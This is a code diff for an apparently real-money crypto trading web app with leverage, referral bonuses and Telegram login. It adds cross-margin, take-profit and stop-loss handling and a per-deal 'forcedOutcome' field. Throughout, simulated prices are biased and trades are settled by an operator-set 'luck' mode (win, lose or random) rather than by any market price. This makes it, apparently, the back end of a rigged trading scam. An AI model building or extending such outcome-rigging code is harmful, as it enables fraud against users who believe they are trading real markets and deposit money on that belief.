@@ -88,7 +88,8 @@ function calculateTradeResult(
   side: Side,
   luckMode: LuckMode,
   moveMinPct: number,
-  moveMaxPct: number
+  moveMaxPct: number,
+  marginMode: 'isolated' | 'cross' = 'isolated'
 ): TradeResult {
   const min = Math.max(0.001, Math.min(moveMinPct, moveMaxPct));
   const max = Math.max(min, Math.min(Math.max(moveMinPct, moveMaxPct), 0.25));
@@ -110,9 +111,19 @@ function calculateTradeResult(
   let finalPnl = Math.round(amount * leveragedPnlPercent);
   let isLiquidated = false;
 
-  if (leveragedPnlPercent <= -1) {
+  // Cross margin allows for more profit but also more loss
+  if (marginMode === 'cross') {
+    finalPnl = Math.round(finalPnl * 1.2); // 20% bonus/penalty
+  }
+
+  // Liquidation check
+  if (marginMode === 'isolated' && leveragedPnlPercent <= -1) {
     isLiquidated = true;
     finalPnl = -amount;
+  } else if (marginMode === 'cross' && leveragedPnlPercent <= -2) {
+    // Cross margin liquidated later (e.g. at -200%)
+    isLiquidated = true;
+    finalPnl = -amount * 2;
   }
 
   return {
@@ -175,8 +186,10 @@ const AppContent: React.FC = () => {
     return () => clearTimeout(timer);
   }, []);
 
-  const refId = typeof window !== 'undefined' ? new URLSearchParams(window.location.search).get('ref') : null;
-  const openSupport = typeof window !== 'undefined' ? new URLSearchParams(window.location.search).get('open') === 'support' : false;
+  const params = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : null;
+  const refId = params?.get('ref') || null;
+  const bonus = params?.get('bonus') ? Number(params.get('bonus')) : null;
+  const openSupport = params?.get('open') === 'support';
   const isLoggedIn = Boolean((tgid || webId) && user);
 
   const [nftRefPolicies, setNftRefPolicies] = React.useState<{
@@ -389,26 +402,54 @@ const AppContent: React.FC = () => {
           const timeElapsed = Date.now() - deal.startTime;
           const isFinished = timeElapsed >= deal.durationSeconds * 1000;
           const currentPrice = deal.currentPrice ?? deal.entryPrice;
+          // TP/SL Triggers
+          const isTP = deal.takeProfitPrice && (
+            (deal.side === 'UP' && currentPrice >= deal.takeProfitPrice) ||
+            (deal.side === 'DOWN' && currentPrice <= deal.takeProfitPrice)
+          );
+          const isSL = deal.stopLossPrice && (
+            (deal.side === 'UP' && currentPrice <= deal.stopLossPrice) ||
+            (deal.side === 'DOWN' && currentPrice >= deal.stopLossPrice)
+          );
 
           // Сделка завершилась: считаем итоговое движение 1–5% и результат по удаче + плечу
-          if (isFinished) {
+          if (isFinished || isTP || isSL) {
             // Compute settlement once and retry saving until DB is updated.
             const cached = settlementCacheRef.current.get(deal.id);
             const settlement =
               cached ??
               (() => {
-                const luckMode: LuckMode = luck === 'win' ? 'WIN' : luck === 'lose' ? 'LOSE' : 'RANDOM';
+                if (isTP || isSL) {
+                  // TP/SL triggered: use the trigger price as final price
+                  const finalPrice = isTP ? deal.takeProfitPrice! : deal.stopLossPrice!;
+                  const priceDiff = deal.side === 'UP' ? finalPrice - deal.entryPrice : deal.entryPrice - finalPrice;
+                  const rawPercentDiff = priceDiff / deal.entryPrice;
+                  const leveragedPercentDiff = rawPercentDiff * deal.leverage;
+                  const finalPnl = Math.round(deal.amount * leveragedPercentDiff);
+                  const isWin = finalPnl > 0;
+                  const payout = isWin ? deal.amount + finalPnl : 0;
+                  const s = { finalPnl, finalPrice, isWin, payout };
+                  settlementCacheRef.current.set(deal.id, s);
+                  return s;
+                }
+
+                const finalLuck = deal.forcedOutcome ?? luck;
+                const luckMode: LuckMode = finalLuck === 'win' ? 'WIN' : finalLuck === 'lose' ? 'LOSE' : 'RANDOM';
                 const { pnl: finalPnl, percentChange } = calculateTradeResult(
                   deal.amount,
                   deal.leverage,
                   deal.side as Side,
                   luckMode,
                   moveRangeRef.current.min,
-                  moveRangeRef.current.max
+                  moveRangeRef.current.max,
+                  deal.marginMode || 'isolated'
                 );
                 const finalPrice = deal.entryPrice * (1 + percentChange);
                 const isWin = finalPnl > 0;
-                const payout = isWin ? deal.amount + finalPnl : 0;
+                
+                // For cross margin, payout can be lower than 0 (deducts from balance)
+                // But for now, we cap it at -stake to avoid complex balance logic in frontend
+                const payout = Math.max(0, deal.amount + finalPnl);
                 const s = { finalPnl, finalPrice, isWin, payout };
                 settlementCacheRef.current.set(deal.id, s);
                 return s;
@@ -501,9 +542,10 @@ const AppContent: React.FC = () => {
           // Пока сделка активна — рывками и с колебаниями, с общим уклоном под удачу
           const baseVolatility = 0.0003 + Math.random() * 0.0012; // переменный шаг ~0.03–0.15%
           let stepSign: number;
-          if (luck === 'win') {
+          const finalLuck = deal.forcedOutcome ?? luck;
+          if (finalLuck === 'win') {
             stepSign = deal.side === 'UP' ? 1 : -1;
-          } else if (luck === 'lose') {
+          } else if (finalLuck === 'lose') {
             stepSign = deal.side === 'UP' ? -1 : 1;
           } else {
             stepSign = Math.random() > 0.5 ? 1 : -1;
@@ -655,7 +697,7 @@ const AppContent: React.FC = () => {
       toast.show(getSupabaseErrorMessage(insertErr, t('deal_creation_error')), 'error');
       return;
     }
-    logAction('deal_open', { userId: uid, tgid, payload: { asset_ticker: newDeal.assetTicker, amount: newDeal.amount, side: newDeal.side } }).catch(() => {});
+    logAction('deal_open', { userId: uid, tgid, payload: { asset_ticker: newDeal.assetTicker, amount: newDeal.amount, side: newDeal.side, email: user?.email ?? null } }).catch(() => {});
     await refreshUser();
     Haptic.medium();
     const dealFromDb = tradeRowToDeal(inserted as any);
@@ -720,6 +762,7 @@ const AppContent: React.FC = () => {
       return (
         <RegisterPage
           refId={refId || ''}
+          bonus={bonus}
           onBack={() => setAuthSubPage(null)}
           onSuccess={() => {
             setAuthGateOpen(false);
@@ -734,6 +777,7 @@ const AppContent: React.FC = () => {
     return (
       <LandingPage
         refId={refId || ''}
+        bonus={bonus}
         onLogin={() => setAuthSubPage('login')}
         onRegister={() => setAuthSubPage('register')}
       />
@@ -804,6 +848,7 @@ const AppContent: React.FC = () => {
       case 'COINS':
         return (
           <CoinsPage
+            onNavigate={handleNavigate}
             onNavigateToTrading={handleNavigateToTrading}
             onOpenNftListing={(row) => {
               setNftGallerySlug(row.collectionSlug);
@@ -1050,7 +1095,9 @@ const AppContent: React.FC = () => {
                 </div>
               </div>
             </Modal>
-            {renderContent()}
+            <div key={currentPage} className="animate-slide-in-right h-full w-full">
+              {renderContent()}
+            </div>
           </Layout>
         </NftReferrerPriceProvider>
       </FullscreenSheetLockProvider>
